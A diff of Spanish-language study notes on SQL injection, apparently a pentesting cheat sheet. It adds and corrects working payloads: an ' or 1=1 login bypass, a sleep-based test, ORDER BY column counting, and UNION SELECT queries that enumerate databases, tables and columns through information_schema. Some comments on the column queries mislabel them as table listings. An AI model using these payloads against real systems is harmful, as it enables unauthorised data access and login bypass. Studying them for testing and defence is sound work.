@@ -46,13 +46,14 @@ Debemos de adivinar cuantas columnas existen. Esperando a que ya no nos muestre 
 * Un indicio de inyeccion SQL es encontrar en la url **.php?id=** No es necesario que diga **id** tambien puede tener otro parametro. 
 
 ```bash
+❯ ' or 1=1-- -                                        # La mas sencilla y nos devolveria un true, aveces hace bypass en el panel de autenticacion 
 ❯ ' and sleep(5)-- -                                  # Haremos que tarde en responder la web 5 segundos
-❯ ' order by 100-- -                                  # Haremos un ordenamiento con la 100va columna 
+❯ ' order by 100-- -                                  # Haremos un ordenamiento con la 100va columna e iremos adivinando hasta que no nos marque un error
 ```
 
 Despues de saber cuantas columnas existen podemos usar Union Select para meter un data en ese columna, esperando a que tambien esa columna acepte datos. Aqui tendriamos un ejemplo de que existen 3 columnas. Pero pueden ser mas o menos, dependiendo la DB.
 ```bash
-❯ ' union select 1,2,3 -- -                           # Inyectamos algo en esa columna
+❯ ' union select 1,2,3 -- -                           # Primero colocamos eso y buscamos cual es el numero que nos pone en el output de la web, ya que es en esa columna en donde podremos inyectar algo
 ❯ ' union select NULL,NULL,NULL -- -                  # Aveces solo acepta NULL en lugar de numeros
 ❯ ' union select "test",NULL,NULL -- -                # Podemos colocar texto 
 ❯ ' union select database(),NULL,NULL -- -            # Queremos que muestre el nombre de la base de datos actual en uso
@@ -67,15 +68,16 @@ Para saber las bases de datos (DB) existentes.
 
 Para saber las tablas de la base de datos (DB) especifica.
 ```bash
-❯ ' union select table_name from information_schema.tables where tables_schema='❮DB_Name❯'-- -                    # Nos muestra las tablas existentes
-❯ ' union select group_concat(table_name) from information_schema.tables where tables_schema='❮DB_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
+❯ ' union select table_name from information_schema.tables where table_schema='❮DB_Name❯'-- -                    # Nos muestra las tablas existentes
+❯ ' union select group_concat(table_name) from information_schema.tables where table_schema='❮DB_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
+❯ ' union select table_name from information_schema.tables limit 0,1-- -                                         # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
 ```
 
 Para saber las columnas de la tabla que encontramos y la base de datos  (DB) especifica.
 ```bash 
-❯ ' union select column_name from information_schema.columns where tables_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las tablas existentes
-❯ ' union select column_name from information_schema.columns where tables_schema='❮DB_Name❯' and table_name='❮Table_Name❯' limit 0,1-- -          # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
-❯ ' union select group_concat(column_name) from information_schema.columns where tables_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
+❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -                    # Nos muestra las tablas existentes
+❯ ' union select column_name from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯' limit 0,1-- -          # Nos muestra las tablas existentes, pero limita a 1 resultado, el que varia es el 0 a 1,2,3, etc...
+❯ ' union select group_concat(column_name) from information_schema.columns where table_schema='❮DB_Name❯' and table_name='❮Table_Name❯'-- -      # Nos muestra las tablas existentes, pero separadas por comas
 ```
 
 Para que nos muestre los datos de las columnas.
